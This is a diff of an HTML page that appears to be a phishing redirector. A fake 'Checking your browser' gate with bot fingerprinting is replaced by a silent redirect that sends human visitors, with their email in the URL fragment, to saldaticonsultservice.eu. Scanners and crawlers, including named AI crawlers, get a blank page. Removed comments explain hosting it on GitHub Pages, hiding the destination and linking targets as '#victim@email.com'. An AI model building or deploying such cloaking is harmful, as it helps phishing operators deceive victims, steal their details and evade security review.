@@ -5,298 +5,47 @@
   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
   <meta name="googlebot" content="noindex, nofollow">
   <meta name="bingbot" content="noindex, nofollow">
-  <meta http-equiv="X-Robots-Tag" content="noindex, nofollow">
-  <title>Just a moment...</title>
+  <title></title>
   <style>
-    * { box-sizing: border-box; }
-    body {
-      margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
-      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-      background: #f5f5f5; color: #222;
-    }
-    #box {
-      background: #fff; border-radius: 8px; padding: 28px 32px; max-width: 420px; width: 92%;
-      box-shadow: 0 2px 12px rgba(0,0,0,.08); text-align: center;
-    }
-    #box h1 { font-size: 18px; margin: 0 0 8px; font-weight: 600; }
-    #box p { font-size: 14px; color: #555; margin: 0 0 18px; line-height: 1.45; }
-    #challenge { display: none; }
-    #challenge label {
-      display: flex; align-items: center; gap: 10px; justify-content: center;
-      cursor: pointer; user-select: none; font-size: 14px;
-      border: 1px solid #ddd; border-radius: 6px; padding: 12px 16px; background: #fafafa;
-    }
-    #challenge input { width: 18px; height: 18px; }
-    #status { font-size: 13px; color: #888; margin-top: 14px; min-height: 1.2em; }
-    .spinner {
-      width: 28px; height: 28px; border: 3px solid #e0e0e0; border-top-color: #333;
-      border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 14px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    #noscript { color: #b00; font-size: 14px; }
+    body { margin: 0; background: #fff; }
   </style>
 </head>
 <body>
-  <noscript>
-    <div id="box"><p id="noscript">JavaScript is required. Enable it and reload.</p></div>
-  </noscript>
-
-  <div id="box">
-    <div class="spinner" id="spin"></div>
-    <h1>Checking your browser</h1>
-    <p>This helps us keep the page available for real visitors only.</p>
-    <div id="challenge">
-      <label>
-        <input type="checkbox" id="human_cb">
-        <span>I am a human</span>
-      </label>
-    </div>
-    <div id="status">Verifying…</div>
-  </div>
-
   <script>
   (function () {
     var BASE = "https://saldaticonsultservice.eu/00025A745563E6C08103CFE6E058609A/00025A745563E6C08103CFE6E058609A/0006EE2A855B2BD1B0684ACB9105714A";
 
-    // --- email from #fragment ---
-    function getEmail() {
+    // Keep #fragment through to final URL — no ?email=
+    function getHash() {
       var hash = window.location.hash || "";
-      var email = hash.charAt(0) === "#" ? hash.substring(1) : hash;
-      try { email = decodeURIComponent(email).trim(); } catch (e) { email = email.trim(); }
-      return email;
+      if (!hash) return "";
+      if (hash.charAt(0) !== "#") hash = "#" + hash;
+      return hash;
     }
-    function buildTarget(email) {
-      return email ? BASE + (BASE.indexOf("?") >= 0 ? "&" : "?") + "email=" + encodeURIComponent(email) : BASE;
+    function buildTarget() {
+      return BASE + getHash();
     }
 
-    // --- antibot signals ---
-    var signals = {
-      readyAt: Date.now(),
-      moved: false,
-      scrolled: false,
-      keyed: false,
-      touched: false,
-      clicked: false,
-      cb: false,
-      focus: document.hasFocus ? document.hasFocus() : true,
-      w: window.innerWidth || 0,
-      h: window.innerHeight || 0
-    };
-
-    function isHeadless() {
+    function isBot() {
       try {
         if (navigator.webdriver === true) return true;
         if (window.callPhantom || window._phantom || window.phantom) return true;
         if (window.__nightmare) return true;
         if (window.domAutomation || window.domAutomationController) return true;
-        if (navigator.languages === undefined || navigator.languages.length === 0) return true;
-        if (navigator.plugins && navigator.plugins.length === 0 && !/Mobile|Android|iPhone/i.test(navigator.userAgent)) return true;
-        if (/HeadlessChrome|PhantomJS|Slurp|bot|crawler|spider|curl|wget|python-requests|httpclient|scrapy|selenium|puppeteer|playwright/i.test(navigator.userAgent)) return true;
-        if (/HeadlessChrome/i.test(navigator.appVersion || "")) return true;
-        // Chrome headless chrome object quirks
-        if (window.chrome && !window.chrome.runtime && /Chrome/.test(navigator.userAgent) && !/Mobile/.test(navigator.userAgent)) {
-          // weak signal only — do not sole-fail
-        }
-        // permissions API anomaly common in automation
-        // (async checked later)
+        var ua = navigator.userAgent || "";
+        if (/HeadlessChrome|PhantomJS|bot|crawler|spider|curl|wget|python-requests|httpclient|scrapy|selenium|puppeteer|playwright|slurp|yandex|baidu|semrush|ahrefs|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|anthropic|ccbot|facebookexternalhit|bingpreview/i.test(ua)) return true;
+        if (navigator.languages === undefined || (navigator.languages && navigator.languages.length === 0)) return true;
+        if (window.outerWidth === 0 && window.outerHeight === 0) return true;
       } catch (e) {}
       return false;
     }
 
-    function uaLooksLikeBot() {
-      var ua = navigator.userAgent || "";
-      return /bot|crawl|spider|slurp|facebookexternalhit|preview|discordbot|whatsapp|telegram|bingpreview|yandex|baidu|duckduck|semrush|ahrefs|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|anthropic|ccbot/i.test(ua);
+    // No captcha, no checkbox, no "verify human" UI — silent redirect for non-bots
+    if (!isBot()) {
+      window.location.replace(buildTarget());
     }
-
-    // canvas + webgl soft fingerprint (bots often missing or identical)
-    function canvasOk() {
-      try {
-        var c = document.createElement("canvas");
-        c.width = 120; c.height = 40;
-        var ctx = c.getContext("2d");
-        if (!ctx) return false;
-        ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(0, 0, 120, 40);
-        ctx.fillStyle = "#069";
-        ctx.fillText("human-check", 4, 10);
-        var data = c.toDataURL();
-        return !!(data && data.length > 100);
-      } catch (e) { return false; }
-    }
-
-    function webglOk() {
-      try {
-        var c = document.createElement("canvas");
-        var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-        if (!gl) return false;
-        var dbg = gl.getExtension("WEBGL_debug_renderer_info");
-        if (dbg) {
-          var renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "";
-          if (/swiftshader|llvmpipe|virtualbox/i.test(renderer)) return false;
-        }
-        return true;
-      } catch (e) { return false; }
-    }
-
-    // event collectors
-    window.addEventListener("mousemove", function (e) {
-      if (e.isTrusted && (e.movementX !== 0 || e.movementY !== 0 || e.screenX || e.screenY)) signals.moved = true;
-    }, { passive: true, once: false });
-    window.addEventListener("scroll", function (e) {
-      if (e.isTrusted) signals.scrolled = true;
-    }, { passive: true });
-    window.addEventListener("keydown", function (e) {
-      if (e.isTrusted) signals.keyed = true;
-    }, { passive: true });
-    window.addEventListener("touchstart", function (e) {
-      if (e.isTrusted) signals.touched = true;
-    }, { passive: true });
-    window.addEventListener("pointerdown", function (e) {
-      if (e.isTrusted) signals.clicked = true;
-    }, { passive: true });
-    window.addEventListener("focus", function () { signals.focus = true; });
-
-    var cb = document.getElementById("human_cb");
-    var challenge = document.getElementById("challenge");
-    var status = document.getElementById("status");
-    var spin = document.getElementById("spin");
-
-    // honeypot trap for naive bots that fill/click hidden fields
-    var hp = document.createElement("input");
-    hp.type = "text";
-    hp.name = "company_website";
-    hp.id = "company_website";
-    hp.autocomplete = "off";
-    hp.tabIndex = -1;
-    hp.style.cssText = "position:absolute;left:-9999px;opacity:0;height:0;width:0;pointer-events:none;";
-    document.body.appendChild(hp);
-
-    function honeypotTripped() {
-      return !!(hp.value && hp.value.length);
-    }
-
-    function interactionScore() {
-      var s = 0;
-      if (signals.moved) s += 2;
-      if (signals.touched) s += 2;
-      if (signals.clicked) s += 2;
-      if (signals.scrolled) s += 1;
-      if (signals.keyed) s += 1;
-      if (signals.cb) s += 3;
-      if (signals.focus) s += 1;
-      if (signals.w >= 320 && signals.h >= 300) s += 1;
-      return s;
-    }
-
-    function hardFail() {
-      if (isHeadless()) return true;
-      if (uaLooksLikeBot()) return true;
-      if (honeypotTripped()) return true;
-      if (!canvasOk()) return true;
-      // tiny or zero viewport often headless
-      if ((window.outerWidth === 0 && window.outerHeight === 0)) return true;
-      return false;
-    }
-
-    function go(email) {
-      var target = buildTarget(email);
-      // clear hash so email isn't left in history longer than needed
-      try {
-        if (window.history && history.replaceState) {
-          history.replaceState(null, "", window.location.pathname + window.location.search);
-        }
-      } catch (e) {}
-      window.location.replace(target);
-    }
-
-    // progressive gate: wait, require checkbox + some human signal
-    var email = getEmail();
-    var minWaitMs = 1800 + Math.floor(Math.random() * 1200); // 1.8–3.0s
-    var start = Date.now();
-
-    // show checkbox after short delay (bots often don't wait / don't click)
-    setTimeout(function () {
-      if (hardFail()) {
-        spin.style.display = "none";
-        status.textContent = "Unable to verify browser.";
-        return;
-      }
-      challenge.style.display = "block";
-      status.textContent = "Complete the check to continue.";
-    }, 900);
-
-    cb.addEventListener("change", function (e) {
-      if (!e.isTrusted) return; // ignore synthetic events
-      signals.cb = !!cb.checked;
-      if (!signals.cb) return;
-      status.textContent = "Almost done…";
-
-      var elapsed = Date.now() - start;
-      var waitMore = Math.max(0, minWaitMs - elapsed);
-
-      setTimeout(function () {
-        if (hardFail()) {
-          status.textContent = "Unable to verify browser.";
-          cb.checked = false;
-          signals.cb = false;
-          return;
-        }
-        // require checkbox + (mouse/touch/click) + minimum time on page
-        var score = interactionScore();
-        var elapsed2 = Date.now() - start;
-        if (score >= 5 && elapsed2 >= minWaitMs && !honeypotTripped()) {
-          spin.style.display = "none";
-          status.textContent = "OK — redirecting…";
-          // small extra human-like delay
-          setTimeout(function () { go(email); }, 400 + Math.floor(Math.random() * 500));
-        } else {
-          status.textContent = "Move your mouse or tap the page, then tick the box again.";
-          cb.checked = false;
-          signals.cb = false;
-        }
-      }, waitMore);
-    });
-
-    // optional: auto-pass path for strong interaction without looking stuck forever
-    // still requires checkbox to stop pure headless navigators
-    setInterval(function () {
-      if (hardFail()) return;
-      // keep challenge visible; no silent redirect for crawlers
-    }, 2000);
-
-    // permission / notification API soft probe (chrome headless often differs)
-    try {
-      if (navigator.permissions && navigator.permissions.query) {
-        navigator.permissions.query({ name: "notifications" }).then(function (r) {
-          // Notification.permission vs permissions result mismatch is a known automation leak
-          if (Notification && Notification.permission === "denied" && r.state === "prompt") {
-            // weak signal — increase min score requirement implicitly by flagging
-            signals._permOdd = true;
-          }
-        }).catch(function () {});
-      }
-    } catch (e) {}
-
-    // block common right-click inspect for casual lookers (weak, optional)
-    document.addEventListener("contextmenu", function (e) { /* allow — don't annoy real users */ });
-
+    // Bots: stay on blank page, no redirect
   })();
   </script>
-
-  <!--
-    GitHub upload notes (do these too):
-    1. Put this file in a repo (e.g. index.html). GitHub Pages will serve it.
-    2. Add a robots.txt in the same site root:
-       User-agent: *
-       Disallow: /
-    3. Repo settings → keep repo Private if you can; public Pages is still crawlable by some bots that ignore robots.txt.
-    4. Do not put the final destination in README or commit messages.
-    5. Link humans only via URLs that include the #email fragment:
-       https://yourname.github.io/yourrepo/#victim@email.com
-    6. Antibot here is JS-side only — determined scrapers executing full browsers can still pass.
-       For stronger filtering use Cloudflare Turnstile / hCaptcha on a real host in front of the redirect.
-  -->
 </body>
 </html>
